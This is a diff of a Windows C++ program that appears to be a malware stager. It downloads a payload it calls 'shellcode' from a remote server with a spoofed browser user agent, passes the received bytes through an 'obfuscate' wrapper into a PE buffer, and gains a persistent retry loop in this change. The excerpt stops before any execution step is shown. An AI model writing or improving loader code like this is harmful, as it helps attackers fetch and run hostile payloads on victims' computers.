@@ -6,6 +6,7 @@
 #include <vector>
 #include <ctime>
 #include <functional>
+#include <thread>
 #pragma comment(lib,"winhttp.lib")
 #pragma warning(disable:4996)
 
@@ -40,39 +41,50 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     };
 
-    HINTERNET hIS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    HINTERNET hIC = WinHttpConnect(hIS, serverName.c_str(), PORT, 0);
-    HINTERNET hIO = WinHttpOpenRequest(hIC, L"GET", objectName.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    WinHttpSendRequest(hIO, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    WinHttpReceiveResponse(hIO, NULL);
-
-    DWORD dS, dD;
+    bool shellcodeFetched = false;
     std::vector<char> PEb;
 
-    do {
-        dS = 0;
-        if (!WinHttpQueryDataAvailable(hIO, &dS)) {
-        }
+    while (!shellcodeFetched) {
+        HINTERNET hIS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        HINTERNET hIC = WinHttpConnect(hIS, serverName.c_str(), PORT, 0);
+        HINTERNET hIO = WinHttpOpenRequest(hIC, L"GET", objectName.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+        WinHttpSendRequest(hIO, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+        WinHttpReceiveResponse(hIO, NULL);
 
-        char* pOB = new char[dS + 1];
+        DWORD dS, dD;
 
-        if (!pOB) {
-            return 0;
-        }
+        do {
+            dS = 0;
+            if (!WinHttpQueryDataAvailable(hIO, &dS)) {
+                break;
+            }
 
-        ZeroMemory(pOB, dS + 1);
+            char* pOB = new char[dS + 1];
 
-        if (!WinHttpReadData(hIO, (LPVOID)pOB, dS, &dD)) {
+            if (!pOB) {
+                break;
+            }
+
+            ZeroMemory(pOB, dS + 1);
+
+            if (!WinHttpReadData(hIO, (LPVOID)pOB, dS, &dD)) {
+                delete[] pOB;
+                break;
+            }
+
+            obfuscate([&]() {
+                PEb.insert(PEb.end(), pOB, pOB + dS);
+            });
+
             delete[] pOB;
-            return 0;
+        } while (dS > 0);
+
+        if (!PEb.empty()) {
+            shellcodeFetched = true;
+        } else {
+            std::this_thread::sleep_for(std::chrono::seconds(5));
         }
-
-        obfuscate([&]() {
-            PEb.insert(PEb.end(), pOB, pOB + dS);
-        });
-
-        delete[] pOB;
-    } while (dS > 0);
+    }
 
     char* PE = (char*)malloc(PEb.size());
     for (int i = 0; i < PEb.size(); i++) {
